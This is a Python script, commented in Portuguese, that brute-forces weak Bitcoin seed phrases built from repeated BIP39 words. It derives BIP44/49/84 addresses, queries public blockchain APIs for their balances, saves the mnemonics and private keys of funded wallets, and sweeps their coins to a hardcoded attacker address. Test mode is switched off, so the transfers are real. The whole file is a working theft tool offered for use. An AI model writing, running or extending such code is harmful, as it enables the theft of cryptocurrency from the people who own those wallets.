#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
================================================================================
BITCOIN WALLET FINDER - VERSÃO WORKERS INDEPENDENTES
================================================================================
Busca carteiras Bitcoin com saldo usando 6 APIs diferentes
- CADA API TEM SEU PRÓPRIO WORKER (thread/tarefa)
- FILA COMPARTILHADA de endereços a verificar
- Cada API trabalha NO SEU RITMO (rate limiter individual)
- Saque automático para carteira configurada
- Suporte a BIP44, BIP49 e BIP84
- Modo 11+1 e 10+2
================================================================================
"""

import asyncio
import httpx
import time
import json
import sys
from mnemonic import Mnemonic
from bip_utils import (
    Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes,
    Bip49, Bip49Coins, Bip84, Bip84Coins
)
from datetime import datetime
from collections import deque
from bit import Key

# ============================================================================
# CONFIGURAÇÕES
# ============================================================================

TIMEOUT = 10
CHECKPOINT_FILE = "checkpoint.json"
SALDO_FILE = "saldo.txt"
BIP39_FILE = "bip39-words.txt"

# Endereço de destino para saque automático
ENDERECO_DESTINO = "bc1qy34f7mqu952svl3eaklwqzw9v6h6paa5led9rs"

# Saldo mínimo para saque automático (em satoshis)
SALDO_MINIMO_SAQUE = 50000  # 0.0005 BTC


# Modo de teste (não envia transações reais)
MODO_TESTE = False  # Mude para True para testar sem enviar
# ============================================================================
# FILA COMPARTILHADA DE ENDEREÇOS
# ============================================================================

class FilaEnderecos:
    """Fila compartilhada de endereços a verificar"""
    
    def __init__(self):
        self.fila = asyncio.Queue()
        self.processados = 0
        self.com_saldo = 0
    
    async def adicionar(self, endereco_info):
        """Adiciona endereço na fila"""
        await self.fila.put(endereco_info)
    
    async def pegar(self):
        """Pega próximo endereço da fila"""
        return await self.fila.get()
    
    def marcar_processado(self):
        """Marca endereço como processado"""
        self.fila.task_done()
        self.processados += 1

# ============================================================================
# WORKER DE API
# ============================================================================

class WorkerAPI:
    """Worker que processa endereços usando uma API específica"""
    
    def __init__(self, nome, req_por_segundo, funcao_verificacao, limite_hora=None):
        self.nome = nome
        self.req_por_segundo = req_por_segundo
        self.intervalo = 1.0 / req_por_segundo if req_por_segundo > 0 else 10.0
        self.funcao_verificacao = funcao_verificacao
        self.limite_hora = limite_hora
        
        # Controle de rate limit
        self.ultima_requisicao = 0
        self.requisicoes_hora = deque()
        
        # Controle de erros 429
        self.erros_429_consecutivos = 0
        self.desativado_ate = 0
        self.ativo = True
        
        # Estatísticas
        self.sucessos = 0
        self.erros = 0
        self.total_verificados = 0
    
    async def aguardar_rate_limit(self):
        """Aguarda o intervalo necessário antes de fazer requisição"""
        
        # Verificar se está desativado temporariamente
        if not self.ativo:
            agora = time.time()
            if agora < self.desativado_ate:
                return False  # Ainda desativado
            else:
                self.ativo = True  # Reativar
                self.erros_429_consecutivos = 0
                print(f"\n✅ {self.nome} reativado!\n")
        
        # Aguardar intervalo entre requisições
        agora = time.time()
        tempo_desde_ultima = agora - self.ultima_requisicao
        
        if tempo_desde_ultima < self.intervalo:
            espera = self.intervalo - tempo_desde_ultima
            await asyncio.sleep(espera)
        
        # Verificar limite por hora
        if self.limite_hora:
            agora = time.time()
            # Remover requisições antigas (mais de 1 hora)
            self.requisicoes_hora = deque([t for t in self.requisicoes_hora if agora - t < 3600])
            
            if len(self.requisicoes_hora) >= self.limite_hora:
                print(f"\n⚠️  {self.nome} atingiu limite de {self.limite_hora} req/hora! Desativando...\n")
                self.ativo = False
                self.desativado_ate = agora + 3600  # Desativa por 1 hora
                return False
            
            self.requisicoes_hora.append(agora)
        
        self.ultima_requisicao = time.time()
        return True
    
    async def processar_endereco(self, client, endereco_info, stats, fila):
        """Processa um endereço usando esta API"""
        
        # Aguardar rate limit
        if not await self.aguardar_rate_limit():
            # API desativada, recolocar endereço na fila
            await fila.adicionar(endereco_info)
            return False
        
        # Verificar saldo
        endereco = endereco_info['endereco']
        
        try:
            tem_saldo, saldo, api_name, erro = await self.funcao_verificacao(client, endereco)
            
            self.total_verificados += 1
            
            if erro:
                self.erros += 1
                stats.registrar_erro(self.nome, erro)
                
                # Se erro 429, desativar temporariamente
                if erro == "429":
                    self.erros_429_consecutivos += 1
                    agora = time.time()
                    
                    # Desativar progressivamente
                    if self.erros_429_consecutivos == 1:
                        tempo_desativacao = 60  # 1 minuto no primeiro erro
                    elif self.erros_429_consecutivos == 2:
                        tempo_desativacao = 180  # 3 minutos no segundo
                    elif self.erros_429_consecutivos == 3:
                        tempo_desativacao = 300  # 5 minutos no terceiro
                    else:
                        tempo_desativacao = 600  # 10 minutos a partir do quarto
                    
                    self.ativo = False
                    self.desativado_ate = agora + tempo_desativacao
                    print(f"\n🔴 {self.nome} desativado por {tempo_desativacao//60} min (erro 429 #{self.erros_429_consecutivos})!\n")
                
                return False
            
            else:
                self.sucessos += 1
                self.erros_429_consecutivos = 0
                stats.registrar_sucesso(self.nome)
                
                if tem_saldo:
                    stats.contador_com_saldo[endereco_info['bip_type']] += 1
                    stats.adicionar_log(f"💎 SALDO! {endereco_info['bip_type']} | {endereco[:24]}... | {saldo} sats | {self.nome}")
                    
                    # Salvar carteira
                    salvar_carteira_com_saldo(
                        endereco_info['mnemonic'],
                        endereco_info['palavra_base'],
                        endereco_info['palavra_var'],
                        endereco_info['bip_type'],
                        endereco_info['info'],
                        saldo,
                        self.nome
                    )
                    
                    # Tentar saque automático se saldo >= mínimo
                    if saldo >= SALDO_MINIMO_SAQUE:
                        wif = endereco_info['info']['wif']
                        sucesso, resultado = await sacar_automaticamente(wif, saldo)
                        
                        if sucesso:
                            stats.adicionar_log(f"✅ Saque automático realizado! TXID: {resultado[:16]}...")
                        else:
                            stats.adicionar_log(f"⚠️  Saque não realizado: {resultado}")
                else:
                    stats.adicionar_log(f"⭕ Sem saldo | {endereco_info['bip_type']} | {endereco[:24]}... | {self.nome}")
                
                return True
        
        except Exception as e:
            self.erros += 1
            stats.adicionar_log(f"❌ {self.nome} erro: {str(e)[:50]}")
            return False
    
    async def run(self, client, fila, stats):
        """Loop principal do worker"""
        
        print(f"🚀 Worker {self.nome} iniciado ({self.req_por_segundo} req/s)")
        
        while True:
            try:
                # Pegar próximo endereço da fila
                endereco_info = await fila.pegar()
                
                # Processar endereço
                sucesso = await self.processar_endereco(client, endereco_info, stats, fila)
                
                # Marcar como processado
                fila.marcar_processado()
            
            except Exception as e:
                stats.adicionar_log(f"❌ Worker {self.nome} erro: {str(e)[:50]}")
                fila.marcar_processado()

# ============================================================================
# FUNÇÕES DE VERIFICAÇÃO DE SALDO (6 APIs)
# ============================================================================

async def verificar_saldo_mempool(client, endereco):
    """Verifica saldo usando Mempool.space"""
    try:
        url = f"https://mempool.space/api/address/{endereco}"
        response = await client.get(url)
        
        if response.status_code == 429:
            return False, 0, "Mempool", "429"
        
        if response.status_code == 200:
            data = response.json()
            
            chain_stats = data.get("chain_stats", {})
            funded = chain_stats.get("funded_txo_sum", 0)
            spent = chain_stats.get("spent_txo_sum", 0)
            saldo = funded - spent
            
            if saldo > 0:
                return True, saldo, "Mempool", None
            return False, 0, "Mempool", None
        
        return False, 0, "Mempool", f"HTTP_{response.status_code}"
    
    except asyncio.TimeoutError:
        return False, 0, "Mempool", "Timeout"
    except Exception as e:
        return False, 0, "Mempool", f"Error_{type(e).__name__}"

async def verificar_saldo_bitaps(client, endereco):
    """Verifica saldo usando Bitaps.com"""
    try:
        url = f"https://api.bitaps.com/btc/v1/blockchain/address/state/{endereco}"
        response = await client.get(url)
        
        if response.status_code == 429:
            return False, 0, "Bitaps", "429"
        
        if response.status_code == 200:
            data = response.json()
            
            balance = data.get("data", {}).get("balance", 0)
            
            if balance > 0:
                return True, balance, "Bitaps", None
            return False, 0, "Bitaps", None
        
        return False, 0, "Bitaps", f"HTTP_{response.status_code}"
    
    except asyncio.TimeoutError:
        return False, 0, "Bitaps", "Timeout"
    except Exception as e:
        return False, 0, "Bitaps", f"Error_{type(e).__name__}"

async def verificar_saldo_blockcypher(client, endereco):
    """Verifica saldo usando BlockCypher"""
    try:
        url = f"https://api.blockcypher.com/v1/btc/main/addrs/{endereco}/balance"
        response = await client.get(url)
        
        if response.status_code == 429:
            return False, 0, "BlockCypher", "429"
        
        if response.status_code == 200:
            data = response.json()
            
            balance = data.get("balance", 0)
            
            if balance > 0:
                return True, balance, "BlockCypher", None
            return False, 0, "BlockCypher", None
        
        return False, 0, "BlockCypher", f"HTTP_{response.status_code}"
    
    except asyncio.TimeoutError:
        return False, 0, "BlockCypher", "Timeout"
    except Exception as e:
        return False, 0, "BlockCypher", f"Error_{type(e).__name__}"

async def verificar_saldo_blockchain(client, endereco):
    """Verifica saldo usando Blockchain.com"""
    try:
        url = f"https://blockchain.info/q/addressbalance/{endereco}"
        response = await client.get(url)
        
        if response.status_code == 429:
            return False, 0, "Blockchain", "429"
        
        if response.status_code == 200:
            balance = int(response.text.strip())
            
            if balance > 0:
                return True, balance, "Blockchain", None
            return False, 0, "Blockchain", None
        
        return False, 0, "Blockchain", f"HTTP_{response.status_code}"
    
    except asyncio.TimeoutError:
        return False, 0, "Blockchain", "Timeout"
    except Exception as e:
        return False, 0, "Blockchain", f"Error_{type(e).__name__}"

async def verificar_saldo_blocknomics(client, endereco):
    """Verifica saldo usando Blocknomics"""
    try:
        url = f"https://www.blocknomics.com/api/balance/{endereco}"
        response = await client.get(url)
        
        if response.status_code == 429:
            return False, 0, "Blocknomics", "429"
        
        if response.status_code == 200:
            data = response.json()
            
            balance = data.get("response", {}).get("balance", 0)
            
            if balance > 0:
                return True, balance, "Blocknomics", None
            return False, 0, "Blocknomics", None
        
        return False, 0, "Blocknomics", f"HTTP_{response.status_code}"
    
    except asyncio.TimeoutError:
        return False, 0, "Blocknomics", "Timeout"
    except Exception as e:
        return False, 0, "Blocknomics", f"Error_{type(e).__name__}"

async def verificar_saldo_blockchair(client, endereco):
    """Verifica saldo usando Blockchair"""
    try:
        url = f"https://api.blockchair.com/bitcoin/dashboards/address/{endereco}"
        response = await client.get(url)
        
        if response.status_code == 429:
            return False, 0, "Blockchair", "429"
        
        if response.status_code == 200:
            data = response.json()
            
            address_data = data.get("data", {}).get(endereco, {}).get("address", {})
            balance = address_data.get("balance", 0)
            
            if balance > 0:
                return True, balance, "Blockchair", None
            return False, 0, "Blockchair", None
        
        return False, 0, "Blockchair", f"HTTP_{response.status_code}"
    
    except asyncio.TimeoutError:
        return False, 0, "Blockchair", "Timeout"
    except Exception as e:
        return False, 0, "Blockchair", f"Error_{type(e).__name__}"

# ============================================================================
# SAQUE AUTOMÁTICO
# ============================================================================

async def sacar_automaticamente(wif, saldo_sats):
    """
    Realiza saque automático para endereço configurado
    
    Args:
        wif: Chave privada em formato WIF
        saldo_sats: Saldo em satoshis
    
    Returns:
        (sucesso, resultado): tupla com status e TXID ou erro
    """
    
    try:
        print(f"\n{'='*80}")
        print(f"💰 INICIANDO SAQUE AUTOMÁTICO")
        print(f"{'='*80}")
        print(f"Saldo: {saldo_sats} sats ({saldo_sats/100000000:.8f} BTC)")
        print(f"Destino: {ENDERECO_DESTINO}")
        
        # Importar chave privada
        key = Key(wif)
        
        print(f"Endereço origem: {key.address}")
        
        # Calcular taxa baseada no saldo
        if saldo_sats < 50000:  # < 0.0005 BTC
            # Taxa máxima: 50% do saldo
            taxa_max_sats = int(saldo_sats * 0.5)
            prioridade = "baixa"
            taxa_sat_vb = 50  # 50 sat/vB - Confirma em ~10-30 min
        elif saldo_sats < 500000:  # < 0.005 BTC
            # Taxa máxima: 20% do saldo
            taxa_max_sats = int(saldo_sats * 0.2)
            prioridade = "media"
            taxa_sat_vb = 100  # 100 sat/vB - Confirma em ~5-10 min
        else:
            # Sem limite de taxa
            taxa_max_sats = None
            prioridade = "maxima"
            taxa_sat_vb = 150  # 150 sat/vB - Confirma em ~1-5 min (próximo bloco!)
        
        print(f"Prioridade: {prioridade.upper()}")
        print(f"Taxa inicial: {taxa_sat_vb} sat/vB")
        
        # Tentar enviar (máximo 10 tentativas)
        for tentativa in range(1, 11):
            try:
                print(f"\nTentativa {tentativa}/10...")
                
                # Estimar tamanho da transação
                # P2PKH: ~192 bytes, P2WPKH: ~141 bytes
                tamanho_tx = 192 if key.address.startswith('1') else 141
                taxa_total = taxa_sat_vb * tamanho_tx
                
                # Verificar se taxa excede limite
                if taxa_max_sats and taxa_total > taxa_max_sats:
                    print(f"   ⚠️  Taxa {taxa_total} sats excede limite de {taxa_max_sats} sats!")
                    print(f"   Ajustando taxa para {taxa_max_sats} sats...")
                    taxa_total = taxa_max_sats
                    taxa_sat_vb = int(taxa_total / tamanho_tx)
                
                valor_enviar = saldo_sats - taxa_total
                
                # Verificar se vale a pena
                if valor_enviar < 10000:  # < 10k sats
                    print(f"   ❌ Valor final muito pequeno ({valor_enviar} sats)")
                    print(f"   Taxa consumiria quase tudo! Apenas salvando...")
                    return False, "Taxa_muito_alta"
                
                print(f"   Valor a enviar: {valor_enviar} sats")
                print(f"   Taxa: {taxa_total} sats ({(taxa_total/saldo_sats)*100:.1f}%)")
                
                # MODO DE TESTE: NÃO ENVIA TRANSAÇÃO REAL
                if MODO_TESTE:
                    print(f"\n⚠️  MODO DE TESTE ATIVADO - TRANSAÇÃO NÃO FOI ENVIADA!")
                    print(f"   Endereço origem: {key.address}")
                    print(f"   Endereço destino: {ENDERECO_DESTINO}")
                    print(f"   Valor: {valor_enviar} sats ({valor_enviar/100000000:.8f} BTC)")
                    print(f"   Taxa: {taxa_sat_vb} sat/vB ({taxa_total} sats total)")
                    print(f"   Tamanho TX: ~{tamanho_tx} bytes")
                    print(f"   Prioridade: {prioridade.upper()}")
                    print(f"\n   Para enviar de verdade, mude MODO_TESTE = False no script!\n")
                    
                    # Simular TXID
                    tx_hash = f"TESTE_{int(time.time())}_{valor_enviar}"
                else:
                    # Criar e enviar transação REAL
                    tx_hash = key.send([(ENDERECO_DESTINO, valor_enviar, 'satoshi')], fee=taxa_sat_vb)
                
                print(f"\n✅ SAQUE REALIZADO COM SUCESSO!")
                print(f"   TXID: {tx_hash}")
                print(f"   Você receberá: {valor_enviar} sats ({valor_enviar/100000000:.8f} BTC)")
                print(f"   Tempo estimado: ~{10 if prioridade == 'maxima' else 30} minutos\n")
                
                # Salvar log
                with open("saques.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n{'='*80}\n")
                    f.write(f"💰 SAQUE AUTOMÁTICO REALIZADO\n")
                    f.write(f"{'='*80}\n")
                    f.write(f"Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Saldo original: {saldo_sats} sats ({saldo_sats/100000000:.8f} BTC)\n")
                    f.write(f"Taxa: {taxa_total} sats ({(taxa_total/saldo_sats)*100:.1f}%)\n")
                    f.write(f"Valor enviado: {valor_enviar} sats ({valor_enviar/100000000:.8f} BTC)\n")
                    f.write(f"Destino: {ENDERECO_DESTINO}\n")
                    f.write(f"TXID: {tx_hash}\n")
                    f.write(f"Prioridade: {prioridade.upper()}\n")
                    f.write(f"Tentativas: {tentativa}\n")
                    f.write(f"{'='*80}\n\n")
                
                return True, tx_hash
            
            except Exception as e:
                erro_str = str(e)
                print(f"   ❌ Erro: {erro_str}")
                
                # Se taxa foi recusada, aumentar 10%
                if "fee" in erro_str.lower() or "insufficient" in erro_str.lower():
                    taxa_sat_vb = int(taxa_sat_vb * 1.1)
                    print(f"   ⚡ Aumentando taxa para {taxa_sat_vb} sat/vB...")
                    await asyncio.sleep(2)
                    continue
                else:
                    # Outro tipo de erro
                    print(f"   ❌ Erro não relacionado a taxa. Abortando...")
                    return False, erro_str
        
        # Esgotou tentativas
        print(f"\n❌ Esgotadas 10 tentativas. Saque não realizado.")
        return False, "Max_tentativas"
    
    except Exception as e:
        print(f"\n❌ Erro fatal no saque: {e}")
        return False, str(e)

# ============================================================================
# ESTATÍSTICAS E PAINEL
# ============================================================================

class Estatisticas:
    """Gerencia estatísticas e exibição do painel"""
    
    def __init__(self):
        self.contador_total = 0
        self.contador_invalidas = 0
        self.contador_validas = 0
        self.contador_verificadas = 0
        self.contador_com_saldo = {'BIP44': 0, 'BIP49': 0, 'BIP84': 0}
        self.inicio = time.time()
        self.logs = deque(maxlen=40)
        self.erros_por_tipo = {}
        self.ultimos_erros = deque(maxlen=10)
        self.api_stats = {
            'Mempool': {'sucessos': 0, 'erros': 0},
            'Bitaps': {'sucessos': 0, 'erros': 0},
            'BlockCypher': {'sucessos': 0, 'erros': 0},
            'Blockchain': {'sucessos': 0, 'erros': 0},
            'Blocknomics': {'sucessos': 0, 'erros': 0},
            'Blockchair': {'sucessos': 0, 'erros': 0}
        }
    
    def adicionar_log(self, mensagem):
        """Adiciona mensagem ao log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logs.append(f"[{timestamp}] {mensagem}")
    
    def registrar_erro(self, api_name, erro):
        """Registra erro"""
        if api_name and api_name in self.api_stats:
            self.api_stats[api_name]['erros'] += 1
        
        if erro:
            self.erros_por_tipo[erro] = self.erros_por_tipo.get(erro, 0) + 1
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.ultimos_erros.append(f"[{timestamp}] {api_name}: {erro}")
    
    def registrar_sucesso(self, api_name):
        """Registra sucesso"""
        if api_name and api_name in self.api_stats:
            self.api_stats[api_name]['sucessos'] += 1
    
    def mostrar_painel(self, workers):
        """Mostra painel de estatísticas"""
        tempo_decorrido = time.time() - self.inicio
        horas = int(tempo_decorrido // 3600)
        minutos = int((tempo_decorrido % 3600) // 60)
        segundos = int(tempo_decorrido % 60)
        
        taxa = (self.contador_verificadas / tempo_decorrido * 60) if tempo_decorrido > 0 else 0
        
        total_com_saldo = sum(self.contador_com_saldo.values())
        
        print("\n" + "=" * 80)
        print("🔍 BITCOIN WALLET FINDER - WORKERS INDEPENDENTES")
        print("=" * 80)
        print(f"⏱️  Tempo: {horas:02d}:{minutos:02d}:{segundos:02d}")
        print(f"📊 Testadas: {self.contador_total} | Válidas: {self.contador_validas} | Verificadas: {self.contador_verificadas}")
        print(f"💎 Com saldo: {total_com_saldo} (BIP44: {self.contador_com_saldo['BIP44']}, BIP49: {self.contador_com_saldo['BIP49']}, BIP84: {self.contador_com_saldo['BIP84']})")
        print(f"⚡ Taxa: {taxa:.1f} endereços/min")
        
        print(f"\n🌐 STATUS DOS WORKERS:")
        for worker in workers:
            status = "🟢 ATIVO" if worker.ativo else "🔴 DESATIVADO"
            total = worker.sucessos + worker.erros
            taxa_sucesso = (worker.sucessos / total * 100) if total > 0 else 0
            print(f"  {worker.nome} ({worker.req_por_segundo} req/s): {status} | ✅ {worker.sucessos} | ❌ {worker.erros} | Taxa: {taxa_sucesso:.1f}%")
        
        if self.erros_por_tipo:
            print(f"\n📛 ERROS POR TIPO:")
            for erro, count in sorted(self.erros_por_tipo.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"  {erro}: {count}")
        
        if self.ultimos_erros:
            print(f"\n🔍 ÚLTIMOS 10 ERROS:")
            for erro in list(self.ultimos_erros)[-10:]:
                print(f"  {erro}")
        
        if self.logs:
            print(f"\n📜 ÚLTIMAS 40 ATIVIDADES:")
            for log in list(self.logs)[-40:]:
                print(f"  {log}")
        
        print("=" * 80)

# ============================================================================
# FUNÇÕES AUXILIARES
# ============================================================================

def carregar_palavras():
    """Carrega lista de palavras BIP39"""
    try:
        with open(BIP39_FILE, "r", encoding="utf-8") as f:
            palavras = [linha.strip() for linha in f if linha.strip()]
        return palavras
    except FileNotFoundError:
        print(f"❌ Arquivo {BIP39_FILE} não encontrado!")
        sys.exit(1)

def validar_mnemonic(mnemonic_str):
    """Valida mnemonic BIP39"""
    mnemo = Mnemonic("english")
    return mnemo.check(mnemonic_str)

def mnemonic_para_seed(mnemonic_str):
    """Converte mnemonic para seed"""
    return Bip39SeedGenerator(mnemonic_str).Generate()

def derivar_bip44_btc(seed_bytes):
    """Deriva endereço BIP44 (Legacy)"""
    bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx

def derivar_bip49_btc(seed_bytes):
    """Deriva endereço BIP49 (SegWit)"""
    bip49_ctx = Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN)
    bip49_acc_ctx = bip49_ctx.Purpose().Coin().Account(0)
    bip49_chg_ctx = bip49_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip49_addr_ctx = bip49_chg_ctx.AddressIndex(0)
    return bip49_addr_ctx

def derivar_bip84_btc(seed_bytes):
    """Deriva endereço BIP84 (Native SegWit)"""
    bip84_ctx = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN)
    bip84_acc_ctx = bip84_ctx.Purpose().Coin().Account(0)
    bip84_chg_ctx = bip84_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip84_addr_ctx = bip84_chg_ctx.AddressIndex(0)
    return bip84_addr_ctx

def mostrar_info(addr_ctx):
    """Extrai informações do contexto de endereço"""
    return {
        "address": addr_ctx.PublicKey().ToAddress(),
        "wif": addr_ctx.PrivateKey().Raw().ToHex(),
        "public_key": addr_ctx.PublicKey().RawCompressed().ToHex(),
        "private_key": addr_ctx.PrivateKey().Raw().ToHex()
    }

def salvar_carteira_com_saldo(mnemonic, palavra_base, palavra_var, bip_type, info, saldo, api_name):
    """Salva carteira com saldo"""
    with open(SALDO_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n{'='*80}\n")
        f.write(f"💎 CARTEIRA COM SALDO ENCONTRADA\n")
        f.write(f"{'='*80}\n")
        f.write(f"Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"API: {api_name}\n")
        f.write(f"Tipo: {bip_type}\n")
        f.write(f"\nPalavra Base: {palavra_base}\n")
        f.write(f"Palavra Variável: {palavra_var}\n")
        f.write(f"\nMnemonic:\n{mnemonic}\n")
        f.write(f"\nEndereço: {info['address']}\n")
        f.write(f"Saldo: {saldo} satoshis ({saldo/100000000:.8f} BTC)\n")
        f.write(f"\nChave Privada (WIF): {info['wif']}\n")
        f.write(f"Chave Privada (HEX): {info['private_key']}\n")
        f.write(f"Chave Pública (HEX): {info['public_key']}\n")
        f.write(f"{'='*80}\n\n")

def salvar_checkpoint(modo, base_idx, var1_idx, var2_idx=None):
    """Salva checkpoint"""
    checkpoint = {
        "modo": modo,
        "base_idx": base_idx,
        "var1_idx": var1_idx
    }
    if var2_idx is not None:
        checkpoint["var2_idx"] = var2_idx
    
    with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
        json.dump(checkpoint, f, indent=2)

def carregar_checkpoint():
    """Carrega checkpoint"""
    try:
        with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return None

# ============================================================================
# GERADOR DE CARTEIRAS
# ============================================================================

async def gerar_carteiras(modo, palavras, fila, stats, checkpoint):
    """Gera carteiras e adiciona endereços na fila"""
    
    # Determinar índices iniciais
    if checkpoint and checkpoint.get("modo") == modo:
        start_base_idx = checkpoint.get("base_idx", 0)
        start_var1_idx = checkpoint.get("var1_idx", 0)
        start_var2_idx = checkpoint.get("var2_idx", 0) if modo == '2' else 0
        print(f"\n✅ Continuando do checkpoint: base={start_base_idx}, var1={start_var1_idx}")
    else:
        start_base_idx = 0
        start_var1_idx = 0
        start_var2_idx = 0
    
    try:
        if modo == '1':
            # Modo 11+1
            for i in range(start_base_idx, len(palavras)):
                palavra_base = palavras[i]
                
                start_j = start_var1_idx if i == start_base_idx else 0
                
                for j in range(start_j, len(palavras)):
                    palavra_var1 = palavras[j]
                    
                    # Gerar mnemonic
                    mnemonic = " ".join([palavra_base] * 11 + [palavra_var1])
                    stats.contador_total += 1
                    
                    if validar_mnemonic(mnemonic):
                        stats.contador_validas += 1
                        stats.adicionar_log(f"✔️ BIP39 Válida | {palavra_base[:3]} {palavra_base[:3]} ... {palavra_var1[:3]}")
                        
                        # Gerar seed
                        seed = mnemonic_para_seed(mnemonic)
                        
                        # Derivar 3 endereços
                        bip44_ctx = derivar_bip44_btc(seed)
                        bip49_ctx = derivar_bip49_btc(seed)
                        bip84_ctx = derivar_bip84_btc(seed)
                        
                        enderecos = {
                            'BIP44': {'ctx': bip44_ctx, 'info': mostrar_info(bip44_ctx)},
                            'BIP49': {'ctx': bip49_ctx, 'info': mostrar_info(bip49_ctx)},
                            'BIP84': {'ctx': bip84_ctx, 'info': mostrar_info(bip84_ctx)}
                        }
                        
                        # Adicionar cada endereço na fila SEQUENCIALMENTE
                        for bip_type, data in enderecos.items():
                            endereco_info = {
                                'endereco': data['info']['address'],
                                'bip_type': bip_type,
                                'mnemonic': mnemonic,
                                'palavra_base': palavra_base,
                                'palavra_var': palavra_var1,
                                'info': data['info']
                            }
                            
                            await fila.adicionar(endereco_info)
                            stats.contador_verificadas += 1
                            
                            # Sleep de 0.1s entre endereços
                            await asyncio.sleep(0.1)
                    else:
                        stats.contador_invalidas += 1
                    
                    # Salvar checkpoint a cada 100
                    if stats.contador_total % 100 == 0:
                        salvar_checkpoint(modo, i, j)
        
        else:
            # Modo 10+2
            for i in range(start_base_idx, len(palavras)):
                palavra_base = palavras[i]
                
                start_j = start_var1_idx if i == start_base_idx else 0
                
                for j in range(start_j, len(palavras)):
                    palavra_var1 = palavras[j]
                    
                    start_k = start_var2_idx if (i == start_base_idx and j == start_var1_idx) else 0
                    
                    for k in range(start_k, len(palavras)):
                        palavra_var2 = palavras[k]
                        
                        # Gerar mnemonic
                        mnemonic = " ".join([palavra_base] * 10 + [palavra_var1, palavra_var2])
                        stats.contador_total += 1
                        
                        if validar_mnemonic(mnemonic):
                            stats.contador_validas += 1
                            stats.adicionar_log(f"✔️ BIP39 Válida | {palavra_base[:3]} {palavra_base[:3]} ... {palavra_var1[:3]} {palavra_var2[:3]}")
                            
                            # Gerar seed
                            seed = mnemonic_para_seed(mnemonic)
                            
                            # Derivar 3 endereços
                            bip44_ctx = derivar_bip44_btc(seed)
                            bip49_ctx = derivar_bip49_btc(seed)
                            bip84_ctx = derivar_bip84_btc(seed)
                            
                            enderecos = {
                                'BIP44': {'ctx': bip44_ctx, 'info': mostrar_info(bip44_ctx)},
                                'BIP49': {'ctx': bip49_ctx, 'info': mostrar_info(bip49_ctx)},
                                'BIP84': {'ctx': bip84_ctx, 'info': mostrar_info(bip84_ctx)}
                            }
                            
                            # Adicionar cada endereço na fila SEQUENCIALMENTE
                            for bip_type, data in enderecos.items():
                                endereco_info = {
                                    'endereco': data['info']['address'],
                                    'bip_type': bip_type,
                                    'mnemonic': mnemonic,
                                    'palavra_base': palavra_base,
                                    'palavra_var': f"{palavra_var1}+{palavra_var2}",
                                    'info': data['info']
                                }
                                
                                await fila.adicionar(endereco_info)
                                stats.contador_verificadas += 1
                                
                                # Sleep de 0.1s entre endereços
                                await asyncio.sleep(0.1)
                        else:
                            stats.contador_invalidas += 1
                        
                        # Salvar checkpoint a cada 100
                        if stats.contador_total % 100 == 0:
                            salvar_checkpoint(modo, i, j, k)
    
    except KeyboardInterrupt:
        print("\n\n⚠️  Gerador interrompido pelo usuário")
        
        # Salvar checkpoint final
        if modo == '1':
            salvar_checkpoint(modo, i, j)
        else:
            salvar_checkpoint(modo, i, j, k)

# ============================================================================
# LOOP PRINCIPAL
# ============================================================================

async def main():
    """Função principal"""
    
    print("\n" + "="*80)
    print("🔍 BITCOIN WALLET FINDER - WORKERS INDEPENDENTES")
    print("="*80)
    print("\nEscolha o modo:")
    print("1. Modo 11+1 (11 palavras fixas + 1 variável)")
    print("2. Modo 10+2 (10 palavras fixas + 2 variáveis)")
    
    modo = input("\nDigite 1 ou 2: ").strip()
    
    if modo not in ['1', '2']:
        print("❌ Modo inválido!")
        return
    
    # Carregar palavras
    palavras = carregar_palavras()
    
    # Carregar checkpoint
    checkpoint = carregar_checkpoint()
    
    # Inicializar
    stats = Estatisticas()
    fila = FilaEnderecos()
    
    # Criar workers (1 por API) - AS 4 MELHORES!
    workers = [
        WorkerAPI('Mempool', 2.0, verificar_saldo_mempool),
        WorkerAPI('Bitaps', 1.0, verificar_saldo_bitaps),
        WorkerAPI('BlockCypher', 1.0, verificar_saldo_blockcypher, 90),
        WorkerAPI('Blockchain', 0.1, verificar_saldo_blockchain)
    ]
    
    print(f"\n🚀 Iniciando busca em modo {modo}...")
    print(f"🎯 4 Workers independentes (Mempool, Bitaps, BlockCypher, Blockchain)")
    print(f"💰 Saque automático para: {ENDERECO_DESTINO}")
    print("\nPressione Ctrl+C para parar com segurança\n")
    
    async with httpx.AsyncClient(timeout=TIMEOUT) as client:
        try:
            # Iniciar workers
            worker_tasks = [
                asyncio.create_task(worker.run(client, fila, stats))
                for worker in workers
            ]
            
            # Iniciar gerador de carteiras
            gerador_task = asyncio.create_task(
                gerar_carteiras(modo, palavras, fila, stats, checkpoint)
            )
            
            # Iniciar painel de estatísticas
            async def mostrar_painel_periodicamente():
                while True:
                    await asyncio.sleep(5)  # Atualiza a cada 5 segundos
                    stats.mostrar_painel(workers)
            
            painel_task = asyncio.create_task(mostrar_painel_periodicamente())
            
            # Aguardar todas as tarefas
            await asyncio.gather(gerador_task, painel_task, *worker_tasks)
        
        except KeyboardInterrupt:
            print("\n\n⚠️  Programa interrompido pelo usuário")
            
            # Cancelar todas as tarefas
            for task in asyncio.all_tasks():
                if task != asyncio.current_task():
                    task.cancel()
            
            # Aguardar cancelamento
            await asyncio.gather(*asyncio.all_tasks(), return_exceptions=True)
        
        finally:
            stats.mostrar_painel(workers)
            print("\n✅ Programa finalizado!")

if __name__ == "__main__":
    asyncio.run(main())
